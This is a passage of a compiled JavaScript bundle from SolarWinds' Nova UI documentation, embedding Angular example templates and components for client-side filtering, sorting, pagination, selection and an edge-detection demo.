*ngFor="let color of allColors; let i = index"\n                        [value]="color"\n                        [checked]="isColorCriteriaChecked(color)"\n                    >\n                        <div class="d-flex align-items-center">\n                            <nui-icon\n                                class="mr-2"\n                                [icon]="colorIcons[color].iconName"\n                            ></nui-icon>\n                            <span class="mr-2">{{ color }}</span>\n                            <span\n                                *ngIf="isGreaterThanZero(showColor(color))"\n                                class="mr-2"\n                                >{{ showColor(color) }}</span\n                            >\n                        </div>\n                    </nui-checkbox>\n                </nui-checkbox-group>\n            </nui-expander>\n        </div>\n        <div class="push-down">\n            <div class="d-flex flex-row">\n                <div class="mb-3" [hidden]="!hasItems()">\n                    <nui-sorter\n                        [itemsSource]="sorterItems"\n                        [selectedItem]="sortBy"\n                        [sortDirection]="initialSortDirection"\n                        (sorterAction)="onSorterAction($event)"\n                        #filteringSorter\n                    >\n                    </nui-sorter>\n                </div>\n                <div class="ml-auto">\n                    <nui-search\n                        [value]="searchTerm"\n                        (search)="applyFilters()"\n                        #filteringSearch\n                    >\n                    </nui-search>\n                </div>\n            </div>\n            <div *ngIf="hasItems(); else emptyListTemplate">\n                <nui-repeat\n                    [itemsSource]="filteringState?.repeat?.itemsSource"\n                    [repeatItemTemplateRef]="listRepeatItemTemplate"\n                    paddingSize="normal"\n                    #filteringRepeat\n                >\n                </nui-repeat>\n            </div>\n            <div class="mt-3" [hidden]="!hasItems()">\n                <nui-paginator\n                    [page]="page"\n                    [total]="filteringState?.paginator?.total"\n                    (pagerAction)="applyFilters()"\n                    #filteringPaginator\n                >\n                </nui-paginator>\n            </div>\n        </div>\n    </nui-panel>\n</div>\n'},87811:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t=".push-down {\n    min-height: 550px;\n}\n"},38799:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport {\n    AfterViewInit,\n    Component,\n    Inject,\n    OnDestroy,\n    ViewChild,\n} from "@angular/core";\nimport _get from "lodash/get";\nimport _isEmpty from "lodash/isEmpty";\nimport { Subscription } from "rxjs";\n\nimport {\n    DataSourceService,\n    IFilter,\n    IMenuItem,\n    IMultiFilterMetadata,\n    INovaFilteringOutputs,\n    ISorterChanges,\n    LocalFilteringDataSource,\n    PaginatorComponent,\n    RepeatComponent,\n    SearchComponent,\n    SorterComponent,\n    SorterDirection,\n} from "@nova-ui/bits";\n\ninterface ExampleItem {\n    color: string;\n    status: string;\n}\n\ninterface IconsOptions {\n    [key: string]: {\n        iconName: string;\n    };\n}\n\ninterface ExpanderOptions {\n    expanded: boolean;\n    header: string;\n}\n\ninterface PanelOptions {\n    panelMode: string;\n    heading: string;\n}\n\nconst RANDOM_ARRAY = [\n    { color: "regular-blue", status: "Critical" },\n    { color: "regular-green", status: "Warning" },\n    { color: "regular-yellow", status: "Up" },\n    { color: "regular-cyan ", status: "Critical" },\n    { color: "regular-magenta", status: "Warning" },\n    { color: "regular-black", status: "Up" },\n    { color: "regular-orange", status: "Up" },\n    { color: "regular-rose", status: "Up" },\n    { color: "regular-violet", status: "Up" },\n    { color: "regular-azure", status: "Critical" },\n    { color: "dark-blue", status: "Warning" },\n    { color: "dark-green", status: "Up" },\n    { color: "dark-yellow", status: "Critical" },\n    { color: "dark-cyan ", status: "Warning" },\n    { color: "dark-magenta", status: "Up" },\n    { color: "dark-black", status: "Critical" },\n    { color: "dark-orange", status: "Warning" },\n    { color: "dark-rose", status: "Up" },\n    { color: "dark-violet", status: "Critical" },\n    { color: "dark-azure", status: "Warning" },\n    { color: "light-blue", status: "Up" },\n    { color: "light-green", status: "Critical" },\n    { color: "light-yellow", status: "Warning" },\n    { color: "light-cyan", status: "Up" },\n    { color: "light-magenta", status: "Critical" },\n    { color: "light-black", status: "Warning" },\n    { color: "light-orange", status: "Up" },\n    { color: "light-rose", status: "Critical" },\n    { color: "light-violet", status: "Warning" },\n    { color: "light-azure", status: "Up" },\n];\n\n/**\n * TODO: Remove in  - NUI-5835\n * @deprecated\n */\n@Component({\n    selector: "nui-deprecated-client-side-filtering-data-source-example",\n    templateUrl: "./client-side-filtering.example.component.html",\n    styleUrls: ["./client-side-filtering.example.component.less"],\n    providers: [\n        {\n            provide: DataSourceService,\n            useClass: LocalFilteringDataSource,\n        },\n    ],\n})\nexport class DepreacatedDataSourceClientSideFilteringExampleComponent\n    implements AfterViewInit, OnDestroy\n{\n    public panelOptions: PanelOptions = {\n        panelMode: "collapsible",\n        heading: "Filters",\n    };\n\n    public colorExpanderOptions: ExpanderOptions = {\n        expanded: true,\n        header: "Colors",\n    };\n\n    public statusExpanderOptions: ExpanderOptions = {\n        expanded: true,\n        header: "Statuses",\n    };\n\n    public statusIcons: IconsOptions = {\n        Critical: { iconName: "status_critical" },\n        Warning: { iconName: "status_warning" },\n        Up: { iconName: "status_up" },\n    };\n\n    public colorIcons: IconsOptions = {\n        azure: { iconName: "record" },\n        black: { iconName: "status_up" },\n        blue: { iconName: "signal-0" },\n        cyan: { iconName: "signal-0" },\n        green: { iconName: "signal-1" },\n        orange: { iconName: "signal-2" },\n        rose: { iconName: "signal-0" },\n        violet: { iconName: "signal-0" },\n        yellow: { iconName: "signal-0" },\n        brown: { iconName: "signal-0" },\n    };\n\n    public allStatuses: string[] = ["Warning", "Critical", "Up"];\n\n    public allColors: string[] = [\n        "azure",\n        "black",\n        "blue",\n        "cyan",\n        "green",\n        "orange",\n        "rose",\n        "violet",\n        "yellow",\n        "brown",\n    ];\n\n    public selectedColorTypes: string[] = ["Up"];\n\n    public selectedCriteriaColors: string[] = ["azure"];\n\n    public readonly sorterItems: IMenuItem[] = [\n        {\n            title: $localize`Color`,\n            value: "color",\n        },\n    ];\n\n    public readonly initialSortDirection = SorterDirection.ascending;\n    public sortBy = this.sorterItems[0].value;\n\n    // By convention this is the object that will contain results of filtering, it should contain the same keys as registered components\n    // We\'re using this object to bind to template items/paginator/filtering data\n    public filteringState: INovaFilteringOutputs = {\n        repeat: {\n            itemsSource: [],\n        },\n        color: [], // This will contain objects like {}\n        status: [],\n        paginator: {\n            // @ts-ignore: used for demo purposes\n            total: undefined,\n        },\n    };\n    public page: number = 1;\n    public searchTerm: string = "";\n    public chosenColors: string[] = [];\n    public chosenStatuses: string[] = [];\n\n    @ViewChild("filteringSearch") filteringSearch: SearchComponent;\n    @ViewChild("filteringSorter") filteringSorter: SorterComponent;\n    @ViewChild("filteringRepeat") filteringRepeat: RepeatComponent;\n    @ViewChild("filteringPaginator") filteringPaginator: PaginatorComponent;\n\n    private outputsSubscription: Subscription;\n\n    constructor(\n        @Inject(DataSourceService)\n        public dataSourceService: DataSourceService<ExampleItem>\n    ) {\n        (\n            this.dataSourceService as LocalFilteringDataSource<ExampleItem>\n        ).setData(RANDOM_ARRAY);\n    }\n\n    public ngAfterViewInit(): void {\n        this.chosenColors = [...this.selectedCriteriaColors];\n        this.chosenStatuses = [...this.selectedColorTypes];\n        this.dataSourceService.registerComponent({\n            ...this.registerComponents(),\n        });\n\n        this.dataSourceService.applyFilters();\n        this.outputsSubscription =\n            this.dataSourceService.outputsSubject.subscribe(\n                (data: INovaFilteringOutputs) => {\n                    this.filteringState = data;\n                    if (data && data.paginator && data.paginator.reset) {\n                        // This allows to go back to first page after filtering/search/sorting has changed\n                        this.filteringPaginator.goToPage(1);\n                    }\n                }\n            );\n    }\n\n    public ngOnDestroy(): void {\n        if (this.outputsSubscription) {\n            this.outputsSubscription.unsubscribe();\n        }\n    }\n\n    private registerComponents = () => ({\n        // Here we\'re registering color and status filters\n        color: {\n            componentInstance: {\n                getFilters: () =>\n                    <IFilter<string[], IMultiFilterMetadata>>{\n                        type: "string[]",\n                        value: this.chosenColors,\n                        metadata: {\n                            allCategories: this.allColors,\n                        },\n                    },\n            },\n        },\n        status: {\n            componentInstance: {\n                getFilters: () =>\n                    <IFilter<string[], IMultiFilterMetadata>>{\n                        type: "string[]",\n                        value: this.chosenStatuses,\n                        metadata: {\n                            allCategories: this.allStatuses,\n                        },\n                    },\n            },\n        },\n        search: {\n            componentInstance: this.filteringSearch,\n        },\n        sorter: {\n            componentInstance: this.filteringSorter,\n        },\n        paginator: {\n            componentInstance: this.filteringPaginator,\n        },\n    });\n\n    public applyFilters(): void {\n        this.dataSourceService.applyFilters();\n    }\n\n    public onSorterAction(changes: ISorterChanges): void {\n        this.sortBy = changes.newValue.sortBy;\n        this.dataSourceService.applyFilters();\n    }\n\n    public onSelectedCriteriaChange($event: string[]): void {\n        this.chosenColors = $event;\n        this.dataSourceService.applyFilters();\n    }\n\n    public onSelectedColorTypesChange($event: string[]): void {\n        this.chosenStatuses = $event;\n        this.dataSourceService.applyFilters();\n    }\n\n    public isColorCriteriaChecked(color: string): boolean {\n        return this.selectedCriteriaColors.indexOf(color) > -1;\n    }\n\n    public isColorTypeChecked(status: string): boolean {\n        return this.selectedColorTypes.indexOf(status) > -1;\n    }\n\n    public hasItems(): boolean {\n        return !_isEmpty(_get(this, "filteringState.repeat.itemsSource"));\n    }\n\n    public showStatus(status: string): string {\n        return this.filteringState.status\n            ? this.filteringState.status[status]\n            : this.filteringState.status;\n    }\n\n    public showColor(color: string): string {\n        return this.filteringState.color\n            ? this.filteringState.color[color]\n            : this.filteringState.color;\n    }\n\n    public isGreaterThanZero(amount: number): boolean {\n        return amount > 0;\n    }\n}\n'},18287:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<ng-template #repeatItemTemplate let-item="item">\n    <div>{{ item.color }}</div>\n</ng-template>\n\n<div class="client-side-example">\n    <div class="d-flex">\n        <div class="flex-row">\n            <nui-selector\n                (selectionChange)="onSelectorOutput($event)"\n                [checkboxStatus]="state.selector?.selectorState.checkboxStatus"\n                [items]="state.selector?.selectorState.selectorItems"\n            >\n            </nui-selector>\n            <nui-search\n                class="searchBar"\n                [value]="searchTerm"\n                (search)="applyFilters()"\n            >\n            </nui-search>\n            <nui-repeat\n                class="repeater"\n                [itemsSource]="state.repeat?.itemsSource"\n                [repeatItemTemplateRef]="repeatItemTemplate"\n                selectionMode="multi"\n                [selection]="state.repeat?.selectedItems"\n                (selectionChange)="onRepeatOutput($event)"\n            >\n            </nui-repeat>\n            <nui-paginator\n                class="paginator"\n                [page]="page"\n                [pageSize]="10"\n                [total]="state.paginator?.total"\n                activeClass="active"\n                disabledClass="disabled"\n                showPrevNext="true"\n                (pagerAction)="applyFilters()"\n            >\n            </nui-paginator>\n        </div>\n    </div>\n</div>\n'},20183:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport {\n    AfterViewInit,\n    ChangeDetectionStrategy,\n    ChangeDetectorRef,\n    Component,\n    OnDestroy,\n    ViewChild,\n} from "@angular/core";\nimport isUndefined from "lodash/isUndefined";\nimport { Subscription } from "rxjs";\n\nimport {\n    INovaFilteringOutputs,\n    ListService,\n    LocalFilteringDataSource,\n    PaginatorComponent,\n    RepeatComponent,\n    RepeatSelectionMode,\n    SearchComponent,\n    SelectionType,\n} from "@nova-ui/bits";\n\ninterface IExampleItem {\n    color: string;\n}\n\n/**\n * TODO: Remove in  - NUI-5835\n * @deprecated\n */\n@Component({\n    selector: "nui-deprecated-client-side-with-selection-example",\n    providers: [LocalFilteringDataSource],\n    templateUrl: "./client-side-with-selection.example.component.html",\n    changeDetection: ChangeDetectionStrategy.OnPush,\n})\nexport class DepreacatedDataSourceWithSelectionExampleComponent\n    implements AfterViewInit, OnDestroy\n{\n    public searchTerm = "";\n    public page = 1;\n\n    public state: INovaFilteringOutputs = {};\n\n    @ViewChild(PaginatorComponent) paginator: PaginatorComponent;\n    @ViewChild(SearchComponent) search: SearchComponent;\n    @ViewChild(RepeatComponent) repeat: RepeatComponent;\n\n    private outputsSubscription: Subscription;\n\n    constructor(\n        public dataSourceService: LocalFilteringDataSource<IExampleItem>,\n        public changeDetection: ChangeDetectorRef,\n        private listService: ListService\n    ) {\n        dataSourceService.setData(getData());\n    }\n\n    public ngAfterViewInit(): void {\n        this.dataSourceService.registerComponent({\n            search: {\n                componentInstance: this.search,\n            },\n            paginator: {\n                componentInstance: this.paginator,\n            },\n            repeat: {\n                componentInstance: this.repeat,\n            },\n        });\n\n        this.outputsSubscription =\n            this.dataSourceService.outputsSubject.subscribe(\n                (data: INovaFilteringOutputs) => {\n                    this.state = { ...this.state, ...data };\n                    this.state = this.listService.updateSelectionState(\n                        this.state\n                    );\n\n                    if (data && data.paginator && data.paginator.reset) {\n                        this.paginator.page = 1;\n                    }\n\n                    const areItemsAvailable =\n                        data.paginator &&\n                        !isUndefined(data.paginator.total) &&\n                        data.paginator.total > 0;\n                    if (\n                        data &&\n                        areItemsAvailable &&\n                        data.repeat?.itemsSource.length === 0\n                    ) {\n                        this.paginator.goToPage(\n                            this.paginator.page > 1\n                                ? this.paginator.page - 1\n                                : 1\n                        );\n                    }\n\n                    this.changeDetection.detectChanges();\n                }\n            );\n\n        this.dataSourceService.applyFilters();\n    }\n\n    public ngOnDestroy(): void {\n        this.outputsSubscription.unsubscribe();\n    }\n\n    public applyFilters(): void {\n        this.dataSourceService.applyFilters();\n    }\n\n    public onSelectorOutput(selectionType: SelectionType): void {\n        this.state = this.listService.applySelector(selectionType, this.state);\n    }\n\n    public onRepeatOutput(selectedItems: IExampleItem[]): void {\n        this.state = this.listService.selectItems(\n            selectedItems,\n            RepeatSelectionMode.multi,\n            this.state\n        );\n    }\n}\n\nfunction getData() {\n    return [\n        { color: "regular-blue" },\n        { color: "regular-green" },\n        { color: "regular-yellow" },\n        { color: "regular-cyan " },\n        { color: "regular-magenta" },\n        { color: "regular-black" },\n        { color: "dark-blue" },\n        { color: "dark-green" },\n        { color: "dark-yellow" },\n        { color: "dark-cyan " },\n        { color: "dark-magenta" },\n        { color: "dark-black" },\n        { color: "light-blue" },\n        { color: "light-green" },\n        { color: "light-yellow" },\n        { color: "light-cyan " },\n        { color: "light-magenta" },\n        { color: "light-black" },\n    ];\n}\n'},20930:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<h2>Local Filtering Data Source</h2>\n<p>\n    The main responsibility of a data source is to process one or more filters\n    (e.g. pagination, sorting, search, etc.) from any filtering components\n    before exposing the data to a presentation layer. The\n    <code>LocalFilteringDataSource</code> aims to allow filtering components to\n    be independent from the main presentation component by allowing each of them\n    to communicate to the service how they each individually want to filter the\n    data. The presentation component can then ask for the pre-filtered data via\n    the service.\n</p>\n<span\n    >Filtering components can be registered with the service in the following\n    manner:</span\n>\n<ul>\n    <li>\n        use\n        <code>\n            this.dataSourceService.componentTree = {{ "{" }} search:\n            {{ "{" }}...{{ "}" }} {{ "}" }};\n        </code>\n        to set components that will be part of filtering process\n    </li>\n    <li>\n        implement <code>getFilteredData</code> in your own service or use\n        existing from <code>LocalFilteringDataSource</code>\n    </li>\n    <li>use it by subscribing to output and applying newly received data</li>\n</ul>\n<p>\n    Visualization of data flow is available\n    <a\n        target="_blank"\n        href="https://cp.solarwinds.com/display/NU/Filtered+view+communication+mechanism"\n        >here</a\n    >.\n</p>\n\n<nui-message type="critical">\n    <strong>Warning:</strong> If you are planning on using\n    <abbr title="Ahead of Time">AoT</abbr> compilation, avoid\n    <b>directly</b> providing <code>LocalFilteringDataSource</code>. The search\n    service inside <code>LocalFilteringDataSource</code> will not be populated\n    under AoT compilation (JIT compilation will work normally). A simple work\n    around is to create a simple class, have it inherit/extend\n    <code>LocalFilteringDataSource</code>, and then provide that.<br />\n    <p>\n        <nui-example-code language="typescript">{{\n            subclassCode\n        }}</nui-example-code>\n    </p>\n</nui-message>\n\n<nui-example-wrapper filenamePrefix="client-side" exampleTitle="Client Side">\n    <nui-deprecated-client-side-basic-data-source-example></nui-deprecated-client-side-basic-data-source-example>\n</nui-example-wrapper>\n\n<h2>Custom Search</h2>\n<p>\n    If needed to fully or partially override logic of\n    <code>SearchService</code>, you can easily provide a new class extended from\n    <code>SearchService</code> using Angular DI on the Component level using\n    <a\n        href="https://angular.io/guide/dependency-injection-providers#alternative-class-providers"\n        >Alternative class provider</a\n    >.\n</p>\n<p>This example shows how to do case-sensitive search.</p>\n<nui-example-wrapper\n    filenamePrefix="client-side-custom-search"\n    exampleTitle="Client-Side Custom Search"\n>\n    <nui-deprecated-client-side-custom-search-example></nui-deprecated-client-side-custom-search-example>\n</nui-example-wrapper>\n\n<h2>Delayed Search</h2>\n<p>The rxjs pipe function can be used to introduce a delay or debounce.</p>\n<nui-example-wrapper\n    filenamePrefix="client-side-delayed"\n    exampleTitle="Client Side Delayed"\n>\n    <nui-deprecated-client-side-delayed-data-source-example></nui-deprecated-client-side-delayed-data-source-example>\n</nui-example-wrapper>\n\n<h2>Filtering</h2>\n<p>\n    Here we\'re combining several components to implement filter panel. For more\n    information please see inline comments.\n</p>\n<nui-example-wrapper\n    filenamePrefix="client-side-filtering"\n    exampleTitle="Manually Composed Filtering Layout"\n>\n    <nui-deprecated-client-side-filtering-data-source-example></nui-deprecated-client-side-filtering-data-source-example>\n</nui-example-wrapper>\n\n<h2>Selection</h2>\n<p>\n    <code\n        ><a href="../injectables/ListService.html" target="_blank"\n            >ListService</a\n        ></code\n    >\n    helps with selection handling, both for the repeat and the selector.\n</p>\n<nui-example-wrapper\n    filenamePrefix="client-side-with-selection"\n    exampleTitle="Client-Side Filtering With Selection"\n>\n    <nui-deprecated-client-side-with-selection-example></nui-deprecated-client-side-with-selection-example>\n</nui-example-wrapper>\n'},55326:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n/**\n * TODO: Remove in  - NUI-5835\n * @deprecated\n */\n@Component({\n    selector: "nui-data-source-example",\n    templateUrl: "./data-source-docs.example.component.html",\n})\nexport class DataSourceExampleComponent {\n    public subclassCode = `\n@Injectable()\nexport class MyNewClass extends LocalFilteringDataSource<ExampleItem> {\n    constructor(@Inject(SearchService) searchService: SearchService) {\n        super(searchService);\n    }\n}`;\n}\n'},69683:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport * from "./deprecated-client-side/docs/data-source-docs.example.component";\nexport * from "./deprecated-client-side/client-side-basic/client-side-basic.example.component";\nexport * from "./deprecated-client-side/client-side-filtering/client-side-filtering.example.component";\nexport * from "./deprecated-client-side/client-side-delayed/client-side-delayed.example.component";\nexport * from "./deprecated-client-side/client-side-with-selection/client-side-with-selection.example.component";\nexport * from "./deprecated-client-side/client-side-custom-search/client-side-custom-search.example.component";\n'},532:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="nui">\n    <div id="nui-demo-services-edge-detection">\n        <h1>Edge detection Service</h1>\n        <div>\n            <form class="row">\n                <div class="col-md-6">\n                    <h2 style="margin-bottom: 30px">\n                        Set the size of the element to be placed\n                    </h2>\n                    <ul>\n                        <li>\n                            <nui-textbox-number\n                                caption="Width in pixels"\n                                name="element-name"\n                                [(value)]="deposit.width"\n                                ngDefaultControl\n                            >\n                            </nui-textbox-number>\n                        </li>\n                        <li>\n                            <nui-textbox-number\n                                caption="Height in pixels"\n                                name="element-height"\n                                [(value)]="deposit.height"\n                                ngDefaultControl\n                            >\n                            </nui-textbox-number>\n                        </li>\n                    </ul>\n                </div>\n                <div class="col-md-6">\n                    <h2>\n                        Set the size of the component where element is to be\n                        placed\n                    </h2>\n                    <p>\n                        <i>Minimum width is 300px and minimum height is 50px</i>\n                    </p>\n                    <ul>\n                        <li>\n                            <nui-textbox-number\n                                caption="Width in pixels"\n                                name="width"\n                                [(value)]="parentComponent.width"\n                                [disabled]="!addEdgeDefinerClass"\n                                ngDefaultControl\n                            >\n                            </nui-textbox-number>\n                        </li>\n                        <li>\n                            <nui-textbox-number\n                                caption="Height in pixels"\n                                name="height"\n                                [(value)]="parentComponent.height"\n                                [disabled]="!addEdgeDefinerClass"\n                                ngDefaultControl\n                            >\n                            </nui-textbox-number>\n                        </li>\n                    </ul>\n                </div>\n            </form>\n            <button nui-button type="button" (click)="update()">\n                Calculate place\n            </button>\n            <br />\n            <h2>Results</h2>\n            <p>\n                <i\n                    >Hover the properties for understanding that exactly what\n                    place-availability does it express</i\n                >\n            </p>\n            <div class="col-md-12">\n                <h3>\n                    <strong *ngIf="!addEdgeDefinerClass"\n                        >Placement within window</strong\n                    >\n                    <strong *ngIf="addEdgeDefinerClass"\n                        >Placement within specified component</strong\n                    >\n                </h3>\n                <div class="results">\n                    <div>\n                        <h3>Can be placed</h3>\n                        <ul>\n                            <li\n                                (mouseover)="showPlaced.top = true"\n                                (mouseleave)="showPlaced.top = false"\n                            >\n                                <b>Top: </b>\n                                <span\n                                    class="label label-success"\n                                    [ngClass]="{\n                                        \'label-danger\': !canBe?.placed.top\n                                    }"\n                                >\n                                    {{ canBe?.placed.top }}\n                                </span>\n                            </li>\n                            <li\n                                (mouseover)="showPlaced.right = true"\n                                (mouseleave)="showPlaced.right = false"\n                            >\n                                <b>Right: </b>\n                                <span\n                                    class="label label-success"\n                                    [ngClass]="{\n                                        \'label-danger\': !canBe?.placed.right\n                                    }"\n                                >\n                                    {{ canBe?.placed.right }}\n                                </span>\n                            </li>\n                            <li\n                                (mouseover)="showPlaced.bottom = true"\n                                (mouseleave)="showPlaced.bottom = false"\n                            >\n                                <b>Bottom: </b>\n                                <span\n                                    class="label label-success"\n                                    [ngClass]="{\n                                        \'label-danger\': !canBe?.placed.bottom\n                                    }"\n                                >\n                                    {{ canBe?.placed.bottom }}\n                                </span>\n                            </li>\n                            <li\n                                (mouseover)="showPlaced.left = true"\n                                (mouseleave)="showPlaced.left = false"\n                            >\n                                <b>Left: </b>\n                                <span\n                                    class="label label-success"\n                                    [ngClass]="{\n                                        \'label-danger\': !canBe?.placed.left\n                                    }"\n                                    (mouseover)="showPlaced.left = true"\n                                    (mouseleave)="showPlaced.left = false"\n                                >\n                                    {{ canBe?.placed.left }}\n                                </span>\n                            </li>\n                        </ul>\n                    </div>\n                    <div>\n                        <h3>Can be aligned</h3>\n                        <ul>\n                            <li\n                                (mouseover)="showAligned.top = true"\n                                (mouseleave)="showAligned.top = false"\n                            >\n                                <b>Top: </b>\n                                <span\n                                    class="label label-success"\n                                    [ngClass]="{\n                                        \'label-danger\': !canBe?.aligned.top\n                                    }"\n                                >\n                                    {{ canBe?.aligned.top }}\n                                </span>\n                            </li>\n                            <li\n                                (mouseover)="showAligned.right = true"\n                                (mouseleave)="showAligned.right = false"\n                            >\n                                <b>Right: </b>\n                                <span\n                                    class="label label-success"\n                                    [ngClass]="{\n                                        \'label-danger\': !canBe?.aligned.right\n                                    }"\n                                >\n                                    {{ canBe?.aligned.right }}\n                                </span>\n                            </li>\n                            <li\n                                (mouseover)="showAligned.bottom = true"\n                                (mouseleave)="showAligned.bottom = false"\n                            >\n                                <b>Bottom: </b>\n                                <span\n                                    class="label label-success"\n                                    [ngClass]="{\n                                        \'label-danger\': !canBe?.aligned.bottom\n                                    }"\n                                >\n                                    {{ canBe?.aligned.bottom }}\n                                </span>\n                            </li>\n                            <li\n                                (mouseover)="showAligned.left = true"\n                                (mouseleave)="showAligned.left = false"\n                            >\n                                <b>Left: </b>\n                                <span\n                                    class="label label-success"\n                                    [ngClass]="{\n                                        \'label-danger\': !canBe?.aligned.left\n                                    }"\n                                >\n                                    {{ canBe?.aligned.left }}\n                                </span>\n                            </li>\n                        </ul>\n                    </div>\n                </div>\n            </div>\n\n            <div class="col-md-12">\n                <h3>By default edge definer element(container) is window</h3>\n                <nui-checkbox\n                    name="parent-class"\n                    [value]="addEdgeDefinerClass"\n                    (valueChange)="switchCheckbox()"\n                    ngDefaultControl\n                >\n                    Add nui-edge-definer class to parent component\n                </nui-checkbox>\n            </div>\n            <br />\n            <div\n                #parent\n                class="parent-component"\n                [ngStyle]="{\n                    width: parentComponent.width + \'px\',\n                    height: parentComponent.height + \'px\'\n                }"\n            >\n                <div class="base-point">\n                    <button nui-button type="button" class="base-point-element">\n                        Basepoint of the place investigation\n                    </button>\n                    <div\n                        class="deposit to-be-placed top"\n                        [ngStyle]="{\n                            height: deposit.height + \'px\',\n                            display: showPlaced.top ? \'flex\' : \'none\'\n                        }"\n                    >\n                        <div class="arrow arrow-up"></div>\n                        <div class="line"></div>\n                    </div>\n                    <div\n                        class="deposit to-be-placed left"\n                        [ngStyle]="{\n                            width: deposit.width + \'px\',\n                            display: showPlaced.left ? \'flex\' : \'none\'\n                        }"\n                    >\n                        <div class="arrow arrow-left"></div>\n                        <div class="line"></div>\n                    </div>\n                    <div\n                        class="deposit to-be-placed right"\n                        [ngStyle]="{\n                            width: deposit.width + \'px\',\n                            display: showPlaced.right ? \'flex\' : \'none\'\n                        }"\n                    >\n                        <div class="arrow arrow-right"></div>\n                        <div class="line"></div>\n                    </div>\n                    <div\n                        class="deposit to-be-placed bottom"\n                        [ngStyle]="{\n                            height: deposit.height + \'px\',\n                            display: showPlaced.bottom ? \'flex\' : \'none\'\n                        }"\n                    >\n                        <div class="arrow arrow-down"></div>\n                        <div class="line"></div>\n                    </div>\n                    <div\n                        class="deposit to-be-aligned top"\n                        [ngStyle]="{\n                            height: deposit.height + \'px\',\n                            display: showAligned.top ? \'flex\' : \'none\'\n                        }"\n                    >\n                        <div class="arrow arrow-down"></div>\n                        <div class="line"></div>\n                    